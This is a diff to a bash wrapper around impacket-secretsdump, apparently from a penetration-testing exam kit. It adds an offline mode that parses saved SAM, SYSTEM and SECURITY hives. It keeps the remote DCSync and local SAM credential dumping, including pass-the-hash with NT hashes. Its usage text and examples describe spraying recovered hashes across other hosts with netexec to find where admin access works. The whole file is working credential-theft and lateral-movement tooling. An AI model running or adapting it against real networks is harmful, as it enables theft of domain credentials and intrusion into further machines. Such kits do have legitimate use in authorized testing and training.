@@ -7,14 +7,18 @@ KIT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
 # the recovered NT hashes across other exam hosts to find lateral movement.
 #
 # Usage:
-#   ad-secretsdump.sh -t <target-IP> [-d domain] [-u user] [-p pass | -H nthash]
-#                     [-l] [-n name] [-S hosts.txt]
+#   Remote:  ad-secretsdump.sh -t <target-IP> [-d domain] -u user [-p pass | -H nthash]
+#                              [-l] [-n name] [-S hosts.txt]
+#   Offline: ad-secretsdump.sh -i <hive-dir> [-n name] [-S hosts.txt]
 #   -t  target to dump (DC for DCSync, or any host for local SAM/LSA)
+#   -i  offline mode: a dir holding saved SAM + SYSTEM (+ optional SECURITY)
+#       hives -> parses them with secretsdump LOCAL (no network). Hive names
+#       are matched case-insensitively (sam, system, security, *.save, ...).
 #   -d  domain (omit or use '.' for a LOCAL account / workgroup host)
 #   -u  username        -p  password        -H  NT hash (pass-the-hash)
 #   -l  local auth: authenticate against the box's SAM, not the domain
 #       (drops the domain prefix from the target so secretsdump auths locally)
-#   -n  workspace name under targets/ (default: <target>)
+#   -n  workspace name under targets/ (default: <target>, or 'offline' with -i)
 #   -S  hosts file — after dumping, spray every recovered NT hash across these
 #       hosts with netexec (finds where else the creds work). Admin => (Pwn3d!)
 #
@@ -23,43 +27,66 @@ KIT="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")/.." && pwd)"
 #   ./ad-secretsdump.sh -t 10.10.10.5 -d corp.local -u Administrator -p 'DAPass!'
 #   # Local SAM dump via pass-the-hash on a standalone host:
 #   ./ad-secretsdump.sh -t 10.10.10.20 -u Administrator -H <nthash> -l
+#   # Offline dump from saved hives (reg save HKLM\SAM sam etc.):
+#   ./ad-secretsdump.sh -i ./loot -n web01
 #   # Dump then spray recovered hashes across the subnet:
 #   ./ad-secretsdump.sh -t 10.10.10.5 -d corp.local -u adm -p Pass1 -S hosts.txt
 
 set -o pipefail
-TARGET=""; DOMAIN=""; USER=""; PASS=""; HASH=""; LOCAL=0; NAME=""; SPRAY_HOSTS=""
-while getopts "t:d:u:p:H:ln:S:h" o; do case "$o" in
+TARGET=""; DOMAIN=""; USER=""; PASS=""; HASH=""; LOCAL=0; NAME=""; SPRAY_HOSTS=""; HIVEDIR=""
+while getopts "t:d:u:p:H:ln:S:i:h" o; do case "$o" in
   t) TARGET=$OPTARG;; d) DOMAIN=$OPTARG;; u) USER=$OPTARG;; p) PASS=$OPTARG;;
   H) HASH=$OPTARG;; l) LOCAL=1;; n) NAME=$OPTARG;; S) SPRAY_HOSTS=$OPTARG;;
+  i) HIVEDIR=$OPTARG;;
   h|*) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
 esac; done
 
-[ -z "$TARGET" ] || [ -z "$USER" ] && { echo "[!] -t <target> and -u <user> required. -h for help."; exit 1; }
-{ [ -z "$PASS" ] && [ -z "$HASH" ]; } && { echo "[!] Provide -p <pass> or -H <nthash>."; exit 1; }
-[ -z "$NAME" ] && NAME=$TARGET
+# --- mode selection: offline hives (-i) vs remote dump ---
+IMPARGS=(); IMPTGT=""; TAG=""
+if [ -n "$HIVEDIR" ]; then
+  # ---------- offline hive mode ----------
+  [ -d "$HIVEDIR" ] || { echo "[!] -i: hive directory '$HIVEDIR' not found."; exit 1; }
+  find_hive(){ find "$HIVEDIR" -maxdepth 1 -type f -iname "$1" 2>/dev/null | sort | head -n1; }
+  SAM=$(find_hive 'sam*'); SYS=$(find_hive 'system*'); SEC=$(find_hive 'security*')
+  { [ -z "$SAM" ] || [ -z "$SYS" ]; } && {
+    echo "[!] -i needs at least SAM and SYSTEM hives in $HIVEDIR (found sam='$SAM' system='$SYS')."; exit 1; }
+  IMPARGS+=(-sam "$SAM" -system "$SYS"); [ -n "$SEC" ] && IMPARGS+=(-security "$SEC")
+  IMPTGT="LOCAL"; TAG="offline"
+  [ -z "$NAME" ] && NAME="offline"
+else
+  # ---------- remote dump mode ----------
+  { [ -z "$TARGET" ] || [ -z "$USER" ]; } && { echo "[!] -t <target> and -u <user> required (or -i <hive-dir>). -h for help."; exit 1; }
+  { [ -z "$PASS" ] && [ -z "$HASH" ]; } && { echo "[!] Provide -p <pass> or -H <nthash>."; exit 1; }
+  # [domain/]user[:pass]@target   (+ -hashes for PtH)
+  # Local auth is implicit: omitting the domain prefix (via PRE when LOCAL=1)
+  # makes secretsdump authenticate against the box's SAM. There is no
+  # -local-auth flag (that's a netexec/crackmapexec option).
+  PRE="$USER"; [ -n "$DOMAIN" ] && [ "$LOCAL" = 0 ] && PRE="$DOMAIN/$USER"
+  if [ -n "$HASH" ]; then IMPARGS+=(-hashes ":$HASH"); IMPTGT="${PRE}@${TARGET}"
+  else IMPTGT="${PRE}:${PASS}@${TARGET}"; fi
+  TAG="$TARGET"
+  [ -z "$NAME" ] && NAME=$TARGET
+fi
+
 OUT="${WORKDIR:-$KIT/targets}/$NAME/loot"
 mkdir -p "$OUT"
 log(){ echo -e "\n\033[1;34m[*] $1\033[0m"; }
 
-# Build impacket target string:  [domain/]user[:pass]@target   (+ -hashes for PtH)
-PRE="$USER"; [ -n "$DOMAIN" ] && [ "$LOCAL" = 0 ] && PRE="$DOMAIN/$USER"
-IMPARGS=()
-if [ -n "$HASH" ]; then IMPARGS+=(-hashes ":$HASH"); TGT="${PRE}@${TARGET}"
-else TGT="${PRE}:${PASS}@${TARGET}"; fi
-# Local auth is implicit in secretsdump: omitting the domain from the target
-# string (handled above via PRE) authenticates against the box's SAM. There is
-# no -local-auth flag (that's a netexec/crackmapexec option).
-
 echo "=================================================="
-echo " SECRETSDUMP   target=$TARGET  as=${DOMAIN:+$DOMAIN/}$USER  local=$LOCAL"
+if [ -n "$HIVEDIR" ]; then
+  echo " SECRETSDUMP   offline hives <- $HIVEDIR"
+  echo "               sam=$(basename "$SAM") system=$(basename "$SYS")${SEC:+ security=$(basename "$SEC")}"
+else
+  echo " SECRETSDUMP   target=$TARGET  as=${DOMAIN:+$DOMAIN/}$USER  local=$LOCAL"
+fi
 echo " output -> $OUT"
 echo "=================================================="
 
 log "Running impacket-secretsdump"
-RAW="$OUT/secretsdump_$TARGET.txt"
-impacket-secretsdump "${IMPARGS[@]}" "$TGT" 2>&1 | tee "$RAW"
+RAW="$OUT/secretsdump_$TAG.txt"
+impacket-secretsdump "${IMPARGS[@]}" "$IMPTGT" 2>&1 | tee "$RAW"
 if ! grep -qiE 'Dumping|:::' "$RAW"; then
-  echo -e "\n[!] No secrets dumped — check creds/privileges (need admin/DA). See $RAW"; exit 2
+  echo -e "\n[!] No secrets dumped — check creds/privileges (need admin/DA) or hive integrity. See $RAW"; exit 2
 fi
 
 log "Parsing recovered material"
